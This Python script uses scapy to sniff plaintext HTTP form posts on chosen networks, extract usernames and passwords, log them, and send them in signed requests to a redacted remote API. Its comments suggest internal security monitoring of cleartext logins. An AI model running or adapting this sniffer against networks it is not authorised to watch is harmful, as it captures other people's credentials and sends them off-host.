#pylint: disable=C0103, C0301, C0325
import json
import urllib
import logging
import requests #http request library, api access
from requests.exceptions import ConnectionError #has to be explicit, not auto-included?
from OpenSSL import crypto #If you're going to engineer it, overengineer it
import base64
from scapy.all import *
try:
    import scapy_http.http
except ImportError:
    from scapy.layers import http #complicated because this layer was originally a third-party addin, but now included
#Change the following line to change log verbosity
# ** DO NOT deploy with logging.DEBUG or passwords will be logged to the configured destination! This is a bad thing!
logging.basicConfig(filename='sniffer.log', filemode='w', level=logging.INFO)
post_headers = {'Content-Type': 'application/json', 'Connection' : 'close'}
passlist = {
    "password=", "Password=", "pass=", "Pass=", "pwd=", "PWD=", "secret="
    } #add more keys here to scrape out of POSTS
userlist = {
    "user=", "User=", "username=", "Username=", "usr=", "login=",
    "Login=", "name=", "Name=", "email=", "Email=", "auth", "Auth",
    "log=", "Log="
    } #add more keys here to scrape out of POSTS

APIURI = "https://lol.nope/redacted"
infra_client_ID = "ALSO-REDACT" #ID provided by infra apps
key_file = open("private.pem", "r") #don't send this file to anyone mkay
shakey = key_file.read()

key_file.close()
if shakey.startswith('-----BEGIN '):
    pkey = crypto.load_privatekey(crypto.FILETYPE_PEM, shakey)
else:
    pkey = crypto.load_pkcs12(shakey).get_privatekey()

def packet_handler(pkt): #Called as a handler for scapy below
    try:
        if pkt[2][1].Method == "POST":
            #logging.debug(pkt[2][1].Host + pkt[2][1].Path)
            #(getattr(pkt[2][1], "Content-Type")) How you have to access this parm because - are not valid in var names?!?
            if getattr(pkt[2][1], "Content-Type") == "application/x-www-form-urlencoded":
                #print bytes(pkt.payload)
                raw_form = bytes(pkt[2][2])
                splitified = raw_form.split("\r\n\r\n") #split on double crlf as per http spec, this will be content
                for passw in passlist:
                    if passw in splitified[1]:
                        logging.debug(splitified)
                        for userstr in userlist:
                            if userstr in splitified[1]:
                                user_rip = urllib.unquote(splitified[1].split(userstr)[1].split("&")[0]).encode('utf-8').strip()
                        try:
                            print(user_rip)
                        except UnboundLocalError: #username not found in blob; bail
                            logging.debug("username bail")
                            break
                        pass_rip = urllib.unquote(splitified[1].split(passw)[1].split("&")[0]).encode('utf-8').strip()

                        try:
                            print(pass_rip)
                        except UnboundLocalError: #password not found in blob; bail
                            logging.debug("password bail")
                            break

                        json_data = \
                        {
                            'username': user_rip,
                            'password': pass_rip,
                            'destination_ip': pkt[IP].dst,
                            'destination_port': pkt[TCP].dport,
                            'service': "http",
                            'url': pkt[2][1].Host + pkt[2][1].Path
                        }
                        json_parsed_results = json.dumps(json_data)
                        logging.debug(json_parsed_results)
                        #sign the json
                        signature = "SHA256 Credential=" + infra_client_ID + ",Signature=" + \
                        base64.b64encode(crypto.sign(pkey, json_parsed_results, "sha256"))
                        logging.debug(signature)
                        post_headers['Authorization'] = signature
                        logging.info("Password sniffed; Source: " + pkt[IP].src + \
                        ", u: " + json_data['username'] + \
                        ", dest: " + json_data['destination_ip'] + \
                        ", url: " + json_data['url'])
                        res = requests.post(APIURI, data=json_parsed_results, headers=post_headers)
                        logging.info("API response was: " + str(res))
    except IndexError:
        pass #for debug, remove or handle me
    except AttributeError:
        pass #for debug, remove or handle me
    except ConnectionError:
        logging.error("Failed to connect to infra apps endpoint; Continuing, but previous request has been discarded!")
#scapy filters uses BPF filters on an intel nic which is compiled to bytecode on the nic and as a result is very fast but behaviour on other platforms may be "undefined"
results = sniff(iface="enp10s0", prn=packet_handler, filter="tcp port 80 and (src net xxx.xxx.xxx.xxx mask xxx.xxx.0.0 or src net xxx.xxx.0.0 mask xxx.xxx.0.0)", store=0)

print(results) #just to see how many packets are dropping
